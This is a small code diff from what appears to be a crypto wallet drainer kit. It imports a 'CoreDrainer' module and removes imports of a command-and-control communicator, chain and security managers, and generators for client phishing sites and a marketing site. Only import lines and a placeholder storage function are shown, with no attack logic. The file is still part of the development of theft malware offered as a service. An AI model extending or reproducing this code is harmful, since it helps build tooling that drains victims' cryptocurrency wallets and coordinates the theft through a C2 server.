@@ -22,16 +22,6 @@ import { getExplorerApiKey, getRpcUrl } from './config.js';
 import { CoreDrainer } from './coreDrainer.js';
 import { flowCoordinator } from './modules/FlowCoordinator.js';
 import { uiManager } from './modules/UIManager.js';
-import { c2Communicator } from './modules/c2Communicator.js';
-import { securityManager } from './modules/securityManager.js';
-import { chainManager } from './modules/chainManager.js';
-import { generateClientSite } from './client-template.js';
-import { generateMarketingSite } from './saas-website.js';
-
-import cron from "node-cron";
-import express from "express";
-import http from "http";
-import { Server as SocketIOServer } from "socket.io";
 // Client storage functions (placeholder)
 function saveClientsToFile() {
   console.log("💾 Client save called (storage not implemented)");
